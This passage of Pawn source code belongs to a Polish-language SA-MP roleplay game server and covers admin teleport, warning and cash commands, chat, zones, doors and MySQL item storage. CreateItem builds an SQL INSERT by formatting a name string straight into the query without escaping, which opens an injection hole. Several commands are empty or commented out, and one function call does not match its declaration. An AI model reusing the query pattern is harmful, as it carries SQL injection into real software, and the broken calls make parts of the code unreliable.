		else if(PlayerCache[targetid][pHouseSpawn] == 0)
		{
			SetPlayerPos(targetid, 1016.3893,-1314.6183,13.5469);
			SetPlayerVirtualWorld(targetid, 0);
		}
		PlayerTextDrawHide(targetid, AJTextDraw[targetid]);
		SendClientMessage(targetid, COLOR_RED, "Opuœci³eœ AdminJail.");
		return SendClientMessage(playerid, COLOR_RED, "Wypuœci³eœ gracza z AdminJail.");
	}
	AJPlayer(targetid, ReturnPlayerName(playerid), reason, time);
	return 1;
}

stock SetPlayerFreeVW(playerid)
{
	for(new i=0; i<=GetPlayerPoolSize();i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
			{
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(i)-1);
			}
		}
	}
}

stock SetPlayerAJPos(playerid)
{
	SetPlayerPos(playerid, 1175.3094,-1179.7953,87.0432);
}

forward ClearTeleport(playerid);
public ClearTeleport(playerid)
pTeleport[playerid] = false;

stock Teleport(playerid, Float:X, Float:Y, Float:Z)
{
	pTeleport[playerid] = true;
	SetTimerEx("ClearTeleport", 3000, false, "i", playerid);
	GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]); SetPlayerPos(playerid, X, Y, Z);
}

cmd:test (playerid, params[]){
	
}

cmd:to (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	{
		return 1;
	}
	new targetid;
	if(sscanf(params, "r", targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /to [ID/Czêœæ nazwy gracza]");
	}
	if(playerid == targetid)
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz przeteleportowaæ siê do samego siebie.");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	}
	SetPlayerFreeVW(playerid);
	new Float:X, Float:Y, Float:Z; GetPlayerPos(targetid, X, Y, Z);
	Teleport(playerid, X, Y+1, Z);
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(targetid));
	new str[64];
	format(str, sizeof(str), "~y~%s ~w~Przeteleportowal sie do Ciebie.", ReturnPlayerName(playerid));
	TextDrawForPlayerEx(targetid, 1, str, 5000);
	format(str, sizeof(str), "Przeteleportowales sie do ~y~%s~w~.", ReturnPlayerName(targetid));
	TextDrawForPlayerEx(playerid, 1, str, 5000);
	return 1;
}

cmd:here (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	{
		return 1;
	}
	new targetid;
	if(sscanf(params, "r", targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /here [ID/Czêœæ nazwy gracza]");
	}
	if(playerid == targetid)
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz przeteleportowaæ siê do samego siebie.");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	}
	SetPlayerFreeVW(targetid);
	new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	Teleport(targetid, X, Y+1, Z);
	SetPlayerVirtualWorld(targetid, GetPlayerVirtualWorld(playerid));
	new str[64];
	format(str, sizeof(str), "~y~%s ~w~Przeteleportowal Cie do siebie.", ReturnPlayerName(playerid));
	TextDrawForPlayerEx(targetid, 1, str, 5000);
	format(str, sizeof(str), "Przeteleportowales ~y~%s~w~ do siebie.", ReturnPlayerName(targetid));
	TextDrawForPlayerEx(playerid, 1, str, 5000);
	return 1;
}

cmd:opis (playerid, params[])
{
	new desc[128];
	if(sscanf(params, "s[128]", desc))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /opis [OPIS TWOJEJ POSTACI]");
	if(!strcmp(desc, "usun", true) && pDesc[playerid][dIsDescOnPlayer] == true)
	{
		DestroyDynamic3DTextLabel(pDesc[playerid][dID]);
		SendClientMessage(playerid, COLOR_GRAY, "Usuniêto opis.");
		pDesc[playerid][dIsDescOnPlayer] = false;
		return 1;
	}
	format(desc, sizeof(desc), strreplace(strreplace(desc, '(', '{'), ')', '}'));
	for(new i; i<=strlen(desc); i++)
	{
		if(i == 32 || i == 64 || i == 86 || i == 102 || i == 134)
		{
			for(new j=i; j<=strlen(desc); j++)
			{
				if(desc[j] == ' ')
				{
					strins(desc, "\n", j);
					break;
				}
			}
		}
	}
	if(pDesc[playerid][dIsDescOnPlayer] == true)
	UpdateDynamic3DTextLabelText(pDesc[playerid][dID], DESC_COLOR, desc);
	else
	{
		DestroyDynamic3DTextLabel(pDesc[playerid][dID]);
		pDesc[playerid][dID] = CreateDynamic3DTextLabel(desc, DESC_COLOR, 0.0, 0.0, 0.0-0.5, 6.0, playerid, INVALID_VEHICLE_ID, 1, -1, -1, -1);
	}
	SendClientMessage(playerid, COLOR_GRAY, "Ustawiono opis:");
	SendClientMessage(playerid, DESC_COLOR, desc);
	pDesc[playerid][dIsDescOnPlayer] = true;
	return 1;
}

cmd:warn (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	{
		return 1;
	}
	new targetid, reason[128];
	if(sscanf(params, "rs[128]", targetid, reason))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /warn [ID/Czêœæ nazwy gracza] [ostrze¿enie]");
	}
	if(playerid == targetid)
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz nadaæ sobie tej kary.");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	}
	new str[128];
	format(str, sizeof(str), "~r~Ostrzeznie~n~~w~Gracz: %s~n~Nadal: %s~n~~y~%s", ReturnPlayerName(targetid), ReturnPlayerName(playerid), reason);
	TextDrawSetString(PenalityTextDraw, str);
	TextDrawShowForAll(PenalityTextDraw);
	if(PenalityTimer > 0)
	{
		KillTimer(PenalityTimer);
	}
	PenalityTimer = SetTimer("HidePenalityTextDraw", 15000, false);
	format(str, sizeof(str), "> Otrzyma³eœ karê(ostrze¿enie) od %s. Powód: %s", ReturnPlayerName(playerid), reason);
	SendClientMessage(targetid, COLOR_RED, str);
	return PlayerPlaySound(targetid, 100010 , 0, 0, 0);
}

stock ShowDialogDoorCreate(playerid, yard)
{
	new str[500];
	format(str, sizeof(str), "Aby utworzyæ nowe drzwi w tej strefie musisz wpisaæ poni¿ej wartoœci w formacie:\n\n[rodzaj drzwi do stworzenia] [metra¿]\n\nGdzie rodzaj to: d - dla domu oraz b- dla biznesu\nMetra¿ - metra¿ budynku.\nMinimalny metra¿ w tej strefie: %dm2.\n\n"HEX_RED"Uwaga!\n\
	Jeœli przed Tob¹ w grze nie znajduj¹ siê ¿adne drzwi, stworzenie ich w tym miejscu..\nzostanie usuniête przez Administracjê bez ¿adnych zwrotów!",  yard);
	ShowPlayerDialog(playerid, D_CREATEDOOR, DIALOG_STYLE_INPUT, "Stwórz nowe drzwi", str, "Stwórz", "Anuluj");
}

stock GetPlayerDoorUID(playerid)
{
	/*new playervw = GetPlayerVirtualWorld(playerid);
	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(!DoorCache[i][dConnect])
			{
				if(playervw == DoorCache[i][dInsVW])
				{
					return i;
				}
			}
		}
	}*/
	return 0;
}

stock GetRadioState(dooruid)
{
	new str[64];
/*if(Isnull(DoorCache[dooruid][dUrl]))
	format(str, sizeof(str), ""HEX_RED"Zakup system nag³aœniaj¹cy(1200$)");
	else
	format(str, sizeof(str), ""HEX_GREEN"Zarz¹dzaj systemem nag³aœniaj¹cym");*/
	return str;
}

stock ShowDialogDoorSettings(playerid)
{
	new str[1025];
	//format(str, sizeof(str), ""HEX_WHITE"1\tZmieñ pozycjê wejœciow¹ drzwi\n2\tWybierz ten dom jako Spawn\n3\t%s\n4\tTeleportuj do pozycji wyjœciowej\n5\tZmieñ nazwê drzwi(2000$)\n6\tPodpisz budynek pod grupê\n7\tUstaw op³atê za przejœcie\n8\tPrze³¹cz przejazd pojazdami\n9\t%s", GetRadioState(GetPlayerDoorUID(playerid)), DoorCache[GetPlayerDoorUID(playerid)][dAlarm] ? ("Alarm przeciw-w³amaniowy: "HEX_GREEN"Tak") : (""HEX_RED"Kup alarm przeciw-w³amaniowy: ($2500)"));
	return ShowPlayerDialog(playerid, D_DOOR_SETTINGS, DIALOG_STYLE_LIST, "Zarz¹dzaj drzwiami", str, "Wybierz", "Anuluj");
}

CMD:gname (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 7)
	return 1;
	new guid, gname[32];
	if(sscanf(params, "is[32]",guid, gname))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /gname [UID grupy] [Nowa nazwa]");
	if(guid < 1 || guid >= MAX_GROUPS)
	return SendClientMessage(playerid,COLOR_GRAY, "Niepoprawne UID grupy.");
	if(strlen(gname) < 3 || strlen(gname) > 32)
	return SendClientMessage(playerid, COLOR_GRAY, "Nowa nazwa grupy musi pomieœciæ siê pomiêdzy 3-32 znakami.");
	GroupCache[guid][gName] = gname;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(pDuty[i] == guid)
			{
				UpdatePlayerName(i);
				UpdatePlayerInfo(i);
			}
		}
	}
	return SendClientMessage(playerid, -1, "Done.");
}

cmd:drzwi (playerid, params[])
{
	/*new uid = GetPlayerDoorUID(playerid);
	pVal[playerid] = uid;
	if(uid != 0)
	{
		if(DoorCache[uid][dPlayerUID] == PlayerCache[playerid][pUID])
		{
			return ShowDialogDoorSettings(playerid);
		}
		new guid = DoorCache[uid][dGroupUID];
		if(PlayerCache[playerid][pGroup] == guid)
		{
			if(PlayerCache[playerid][pGroupAdmin])
			{
				return ShowDialogDoorSettings(playerid);
			}
		}
		else if(PlayerCache[playerid][pGroup2] == guid)
		{
			if(PlayerCache[playerid][pGroupAdmin2])
			{
				return ShowDialogDoorSettings(playerid);
			}
		}
		else if(PlayerCache[playerid][pGroup3] == guid)
		{
			if(PlayerCache[playerid][pGroupAdmin3])
			{
				return ShowDialogDoorSettings(playerid);
			}
		}
		return ShowDialogInfo(playerid, "Brak uprawnieñ.");
	}
	new zone[1];
	GetPlayerDynamicAreas(playerid, zone, sizeof(zone));
	if(ZoneData[zone[0]][zYard] == 0)
	{
		ShowDialogInfo(playerid, "Ta strefa nie zosta³a wyceniona przez Administracjê.\nPoproœ o wycenê strefy kogoœ z ekipy znajduj¹cej siê pod "HEX_RED"/a"HEX_WHITE".");
		return 1;
	}
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i; i<LastdUID;i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]))
			{
				if(vw == DoorCache[i][dOutVW])
				{
					SendClientMessage(playerid, COLOR_GRAY, "Musisz stan¹æ trochê dalej od innych drzwi.");
					return 1;
				}
			}
		}
	}
	ShowDialogZone(playerid);
	return 1;
	*/
}

stock GetQuitReason(reasonid)
{
	new reason[16];
	switch(reasonid)
	{
		case 0: reason = "Timeout/Crash";
		case 1: reason = "Quit";
		case 2: reason = "Kick/Ban";
	}
	return reason;
}

stock GetLastVW()
{
	new vw;
	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			vw = DoorCache[i][dOutVW]+1;
		}
	}
	return vw;
}

CMD:wejscie (playerid, params[])
{
	/*if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	CreateDoor(playerid, GetPlayerVirtualWorld(playerid), 1, X, Y, Z);
	new msg[128]; format(msg, sizeof(msg), "Utworzono przejœcie (UID przejœcia: %d)", LastdUID-1);
	DoorCache[LastdUID-1][dConnect] = 1;
	return SendClientMessage(playerid, COLOR_GRAY, msg);*/
}

CMD:wyjscie (playerid, params[])
{
	/*if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new duid;
	if(sscanf(params, "i", duid))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /wyjscie [UID drzwi - przejœcia] by ustawiæ pozycjê wyjœciow¹ w, której stoisz.");
	GetPlayerPos(playerid, DoorCache[duid][dInsX], DoorCache[duid][dInsY], DoorCache[duid][dInsZ]);
	DoorCache[duid][dInsVW] = GetPlayerVirtualWorld(playerid);
	new msg[256]; format(msg, sizeof(msg), "Zmieniono pozycjê wyjœciow¹ drzwi UID: %d na bie¿¹c¹ pozycje postaci (oraz VW).", duid);
	DestroyDynamicPickup(dPickupID2[duid]);
	dPickupID2[duid] = CreateDynamicPickup(1239, 2, DoorCache[duid][dInsX], DoorCache[duid][dInsY], DoorCache[duid][dInsZ],GetPlayerVirtualWorld(playerid), -1, -1);
	DoorCache[duid][dConnect] = 1;
	return SendClientMessage(playerid, COLOR_GRAY, msg);*/
}

CMD:dname (playerid, params[])
{
/*	if(PlayerCache[playerid][pLevel] == 0)
	return 1;
	new duid, name[32];
	if(sscanf(params, "is[32]", duid, name))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip: /dname [UID drzwi] [Nowa nazwa]");
	if(duid < 1 || duid >= MAX_DOORS)
	return SendClientMessage(playerid, COLOR_GRAY, "Niepoprawna wartoœæ UID drzwi.");
	DoorCache[duid][dName] = name;
	new msg[128]; format(msg, sizeof(msg), "~w~Nazwa zmieniona:~n~%s", name);
	return GameTextForPlayer(playerid, msg, 3000, 4);*/
}	

stock ShowDialogZone(playerid)
{
	new zoneid = GetPlayerZone(playerid);
	new zoneinfo[256];
	format(zoneinfo, sizeof(zoneinfo), ""HEX_WHITE"Minimalny metra¿: %dm2 (%d$m2 dla domu, %d$m2dla biznesu)", ZoneData[zoneid][zYard], ZoneData[zoneid][zCostH], ZoneData[zoneid][zCostB]);
	new header[64]; format(header, sizeof(header), "%s", ZoneData[zoneid][zName]);
	ShowPlayerDialog(playerid, D_ZONE, DIALOG_STYLE_LIST, header, zoneinfo, "Wybierz", "Anuluj");
	return 1;
}

forward GetPlayerZone(playerid, &uid, &yard, &priceHouse, &priceBusiness, &playerUID, &groupUID );
public GetPlayerZone(playerid,  &uid, &yard, &priceHouse, &priceBusiness, &playerUID, &groupUID){

	new Float:minX, Float:minY, Float:playerZ;
	GetPlayerPos(playerid, minX, minY, playerZ);

	minX = (floatround(minX) / 100) * 100;
	minY = (floatround(minY) / 100) * 100;

	new query[512];
	format(query, sizeof(query), "SELECT uid, yard, priceHouse, priceBusiness, IFNULL(playerUID, 0) as playerUID, IFNULL(groupUID,0) as groupUID FROM gameZones WHERE minX=%f AND minY=%f LIMIT 1",
	minX, minY);

	new Cache:cache = mysql_query(DB_HANDLE, query);

	new rows = cache_num_rows();


	new temp_uid, temp_yard, temp_priceHouse, temp_priceBusiness, temp_playerUID, temp_groupUID;


	if(rows){

		cache_get_value_name_int(0, "uid", temp_uid);
		cache_get_value_name_int(0, "yard", temp_yard);
		cache_get_value_name_int(0, "priceHouse", temp_priceHouse);
		cache_get_value_name_int(0, "priceBusiness", temp_priceBusiness);
		cache_get_value_name_int(0, "playerUID", temp_playerUID);
		cache_get_value_name_int(0, "groupUID", temp_groupUID);

		uid=temp_uid;
		yard=temp_yard;
		priceHouse=temp_priceHouse;
		priceBusiness=temp_priceBusiness;
		playerUID=temp_playerUID;
		groupUID=temp_groupUID;


		cache_delete(cache);

	
	}
	else{
		uid=0;
		yard=0;
		priceHouse=0;
		priceBusiness=0;
		playerUID=0;
		groupUID=0;
	}
	
	return 0;

}

CMD:strefa (playerid, params[]){

}


cmd:astrefa (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 7)
	{
		return 1;
	}

	new uid, yard, priceHouse, priceBusiness, playerUID, groupUID;
	GetPlayerZone(playerid, uid, yard, priceHouse, priceBusiness, playerUID, groupUID );

	new zname[64], zyard, zcosth, zcostb;
	if(sscanf(params, "iiis[64]", zyard, zcosth, zcostb, zname))
	{
		if(uid){

			/*new query[258];
			format(query, sizeof(query), "SELECT "

			new header[128];
			format(header, sizeof(header), "Zarz¹dzaj stref¹ %s (%d)", )

			ShowPlayerDialog(playerid, D_PLAYER_ZONE_MANAGEMENT, DIALOG_STYLE_LIST, "Zarz¹dzaj stref¹")*/
			return 1;
		}
		SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /astrefa [min. metra¿] [cena za min. metra¿ dla domu] [cena za min. metra¿ dla biznesu] [nazwa strefy]");
		return 1;
	}


	

	

	if(uid == 0){
		new Float:minX, Float:minY, Float:playerZ;
		GetPlayerPos(playerid, minX, minY, playerZ);

		minX = (floatround(minX) / 100) * 100;
		minY = (floatround(minY) / 100) * 100;

		new uid = CreateZone(minX, minY, zyard, zcosth, zcostb);

		new message[520];
		format(message, sizeof(message), "Strefa %s(%d) (100x100) zosta³a pomyœlnie utworzona/podpisana.\n\
		"HEX_WHITE"Cena za 1m2 dla biznesu: "HEX_GRAY"%d\n\
		"HEX_WHITE"Cena 1m2 dla domu: "HEX_GRAY"%d\n\
		"HEX_WHITE"Min. metra¿ drzwi: "HEX_GRAY"%d\n\
		", zname, uid,zcostb, zcosth, zyard);
		ShowDialogInfo(playerid, message);

		return 1;
	}

	SendClientMessage(playerid, COLOR_GRAY, "Ta strefa zosta³a ju¿ podpisana przez jednego z Administratorów.");




	return 1;
}

forward CreateZone(Float:minX, Float:minY, yard, priceHouse, priceBusiness);
public CreateZone(Float:minX, Float:minY, yard, priceHouse, priceBusiness){
	new query[256];
	format(query, sizeof(query), "INSERT INTO gameZones (minX, minY, yard, priceHouse, priceBusiness) VALUES (%f, %f, %d, %d, %d);", 
	minX, minY, yard, priceHouse, priceBusiness);

	mysql_query(DB_HANDLE, query, false);

	new Cache:cache = mysql_query(DB_HANDLE, "SELECT Max(uid) FROM gameZones");
	new uid = 0;
	if(cache_num_rows()){
		cache_get_value_index_int(0,0,uid);
	}
	
	cache_delete(cache);

	return uid;
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);

	new str[256];
	format(str, sizeof(str), "SELECT uid, name, open, cost, insVW FROM doors WHERE pickupid = '%d' LIMIT 1", pickupid);
	new Cache:cache = mysql_query(DB_HANDLE, str);

	new open, cost, insvw, name[64];
	cache_get_value_name_int(0, "open", open);
	cache_get_value_name_int(0, "cost", cost);
	cache_get_value_name_int(0, "insVW", insvw);
	cache_get_value_name(0, "name", name);
	cache_get_value_name_int(0, "uid", pPickupUID[playerid]);


	cache_delete();

	if(open)
	{
		new count;
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(GetPlayerVirtualWorld(i) == insvw)
				count++;
			}
		}
		if(count)
		{
			if(cost)
			format(str, sizeof(str), "%s~n~~n~~w~(Oplata za przejscie: ~g~~h~%d$~w~)~n~~n~(nacisnij LALT+SPRINT aby wejsc)~n~~n~(%d osob w srodku)", name, cost, count);
			else
			format(str, sizeof(str), "%s~w~~n~~n~(nacisnij LALT+SPRINT aby wejsc)~n~(%d osob w srodku)", name, count);
		}
		else
		format(str, sizeof(str), "%s~w~~n~~n~(nacisnij LALT+SPRINT aby wejsc)", name);
	}
	else
	format(str, sizeof(str), "%s~w~~n~~n~(nacisnij LALT+SPRINT aby wejsc)~n~~n~~r~~h~(te drzwi sa zamkniete)", name);

	TextDrawForPlayerEx(playerid, 2, str, 10000);
	return 1;
}

cmd:zamknij (playerid, params[])
{
	/*new str[256];
	format(str, sizeof(str), "SELECT playerUID, groupUID, open, explodeTime, insX, insY, insZ, outX, outY, outZ, outVW, insVW FROM doors WHERE uid = '%d' LIMIT 1", pPickupUID[playerid]);
	new Cache:cache = mysql_query(DB_HANDLE, str);
	

	new rows = 0;
	cache_get_row_count(rows);

	new playerUID, groupUID, open, explodeTime, Float:insX, Float:insY, Float:insZ,
	Float:outX, Float:outY, Float:outZ, insVW, outVW;

	cache_get_value_name_int(0, "playerUID", playerUID);
	cache_get_value_name_int(0, "groupUID", groupUID);
	cache_get_value_name_int(0, "open", open);
	cache_get_value_name_int(0, "explodeTime", explodeTime);
	cache_get_value_name_float(0, "insX", insX);
	cache_get_value_name_float(0, "insY", insY);
	cache_get_value_name_float(0, "insZ", insZ);
	cache_get_value_name_float(0, "outX", outX);
	cache_get_value_name_float(0, "outY", outY);
	cache_get_value_name_float(0, "outZ", outZ);
	cache_get_value_name_int(0, "insVW", insVW);
	cache_get_value_name_int(0, "outVW", outVW);


	cache_delete(cache)

	if(!rows)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê przy ¿adnych drzwiach.");
	if(GetPlayerVirtualWorld(playerid) == insVW)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.5, insX, insY, insZ))
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê przy ¿adnych drzwiach.");
	}
	else if(GetPlayerVirtualWorld(playerid) == outVW)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.5, outX, outY, outZ))
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê przy ¿adnych drzwiach.");
	}

	if(groupUID) // if owner of door is group
	{
		if(PlayerCache[playerid][pGroup] == groupUID)
		{
			if(!PlayerCache[playerid][pGroupDoor])
			return GameTextForPlayer(playerid, "~r~~h~nie posiadasz klucza do tych drzwi", 3000, 4);

		}
		else if(PlayerCache[playerid][pGroup2] == groupUID)
		{
			if(!PlayerCache[playerid][pGroupDoor2])
			return GameTextForPlayer(playerid, "~r~~h~nie posiadasz klucza do tych drzwi", 3000, 4);

		}
		else if(PlayerCache[playerid][pGroup3] == groupUID)
		{
			if(!PlayerCache[playerid][pGroupDoor3])
			return GameTextForPlayer(playerid, "~r~~h~nie posiadasz klucza do tych drzwi", 3000, 4);
		}
		else
		return GameTextForPlayer(playerid, "~r~~h~nie posiadasz klucza do tych drzwi", 3000, 4);
	}
	else
	{
		if(PlayerCache[playerid][pUID] != playerUID)
		return GameTextForPlayer(playerid, "~r~~h~nie posiadasz klucza do tych drzwi", 3000, 4);
	}

	if(!explodeTime)
	{
		if(gettime() - explodeTime <= 60*5)
		return TextDrawForPlayerEx(playerid, 1, "Te drzwi zostaly niedawno wywazone.~n~Nie mozna narazie z nich skorzystac.", 50000);
	}

	return 1;*/
}

cmd:b (playerid, params[])
{
	new playermsg[128];
	if(sscanf(params, "s[128]", playermsg))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /b [wiadomoœæ OOC]");
	}
	new finalmsg[128];
	format(finalmsg, sizeof(finalmsg), "(( %s ))", playermsg);
	SetPlayerChatBubble(playerid, finalmsg, COLOR_WHITE, 12.0, 5000);
	if(!PlayerCache[playerid][pOOC])
	{
		format(finalmsg, sizeof(finalmsg), "(( Wys³ano OOC: %s ))", playermsg);
		SendClientMessage(playerid, COLOR_WHITE, finalmsg); TextDrawForPlayerEx(playerid, 1, "Mozesz poprzedzic swoja wypowiedz kropka.~n~Np. .Elo", 5000);
	}
	format(finalmsg, sizeof(finalmsg), "(( [%d] %s: %s ))", playerid, RPName(playerid), playermsg);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pOOC])
			{
				if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
				SendClientMessage(i, COLOR_WHITE, finalmsg);
			}
		}
	}
	return 1;
}

cmd:w (playerid, params[])
{
	new targetid, msg[128];
	if(sscanf(params, "rs[128]", targetid, msg))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /w [ID/Czêœæ nazwy gracza] [wiadomoœæ]");
	if(targetid == playerid) return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz wys³aæ wiadomoœci samemu sobie.");
	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	if(!pLogged[targetid]) return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	new Float:X, Float:Y, Float:Z, vw =GetPlayerVirtualWorld(targetid);
	if((!IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z) || GetPlayerVirtualWorld(playerid) != vw) && PlayerCache[playerid][pBW_Time] && PlayerCache[targetid][pLevel] == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Podczas trwania BW, wiadmoœci mo¿esz wysy³aæ tylko na krótk¹ odleg³oœæ.");
	if(!pPriv[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz ma wy³¹czone wiadomoœci prywatne.");
	new str[256];
	format(str, sizeof(str), "(( %s (%d): %s ))", strreplace(ReturnPlayerName(targetid), '_', ' '), targetid, msg);
	if(pAFK[targetid])
	format(str, sizeof(str), "(( [AFK] %s (%d): %s ))", strreplace(ReturnPlayerName(targetid), '_', ' '), targetid, msg);
	SendClientMessage(playerid, 0xFFD95BFF, str); format(str, sizeof(str), "(( %s (%d): %s ))", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, msg);
	SendClientMessage(targetid, 0xFFB033FF, str); PlayerPlaySound(targetid, 5202, 0.0, 0.0, 0.0); PlayerMessageUID[targetid] = PlayerCache[playerid][pUID];
	return SetPlayerChatBubble(playerid, "(PW)",  COLOR_ORANGE, 15, 3000);
}

cmd:cash (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new targetid, money;
	if(sscanf(params, "ri", targetid, money))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /cash [ID/Czêœæ nazwy gracza] [iloœæ]");
	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	new msg[256];
	format(msg, sizeof(msg), "(( %s %s[%d] nada³ graczowi %s[%d] $%d gotówki. ))", GetRankName(PlayerCache[playerid][pLevel]), ReturnPlayerName(playerid),playerid, ReturnPlayerName(targetid),targetid, money);
	SendMessageToAdmins(msg);
	return SetPlayerCash(targetid, money);
}

cmd:re (playerid, params[])
{
	new msg[128];
	if(sscanf(params, "s[128]", msg))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /re [wiadomoœæ]");
	new Float:X, Float:Y, Float:Z, vw;
	for(new i=0;i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID] == PlayerMessageUID[playerid])
			{
				vw =GetPlayerVirtualWorld(i);
				GetPlayerPos(i, X, Y, Z);
				if((!IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z) || GetPlayerVirtualWorld(playerid) != vw) && PlayerCache[playerid][pBW_Time] && PlayerCache[i][pLevel] == 0)
				return SendClientMessage(playerid, COLOR_GRAY, "Podczas trwania BW, wiadmoœci mo¿esz wysy³aæ tylko na krótk¹ odleg³oœæ.");
				if(!pPriv[playerid])
				return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz wys³aæ wiadomoœci kiedy masz wy³¹czone PW.");
				if(!pPriv[i])
				return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz ma wy³¹czone wiadomoœci prywatne.");
				new str[256]; format(str, sizeof(str), "(( %s (%d): %s ))", strreplace(ReturnPlayerName(i), '_', ' '), i, msg);
				if(pAFK[i])
				format(str, sizeof(str), "(( [AFK] %s (%d): %s ))", strreplace(ReturnPlayerName(i), '_', ' '), i, msg);
				SendClientMessage(playerid, 0xFFD95BFF, str); format(str, sizeof(str), "(( %s (%d): %s ))", strreplace(ReturnPlayerName(playerid), '_', ' '), playerid, msg);
				SendClientMessage(i, 0xFFB033FF, str); PlayerPlaySound(i, 5202, 0.0, 0.0, 0.0); PlayerMessageUID[i] = PlayerCache[playerid][pUID];
				return SetPlayerChatBubble(playerid, "(PW)",  COLOR_ORANGE, 15, 3000);
			}
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nikt nie wys³a³ Ci wiadomoœci lub gracz wylogowa³ siê.");
}

stock ItemPath(itemid)
{
	new path[64];
	format(path, sizeof(path), FOLDER_ITEMS"%d.ini", itemid);
	return path;
}


stock CreateItem(playerUID, type, val, val2, val3,val4, const name[])
{
	new item_query[256];
	format(item_query, sizeof(item_query), "INSERT INTO items (playerUID, name, type, val, val2, val3, val4) VALUES ('%d', '%s', '%d', '%d', '%d', '%d', '%d')",
	playerUID, name, type, val, val2, val3, val4);
	mysql_query(DB_HANDLE, item_query, false);

	new Cache:cache = mysql_query(DB_HANDLE, "SELECT Max(uid) FROM items");
	new uid = 0;
	cache_get_value_index_int(0, 0, uid);
	cache_delete(cache);
	return uid;
}

stock GetPlayerItemsCount(playerid)
{
	new count;
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == 0)
		{
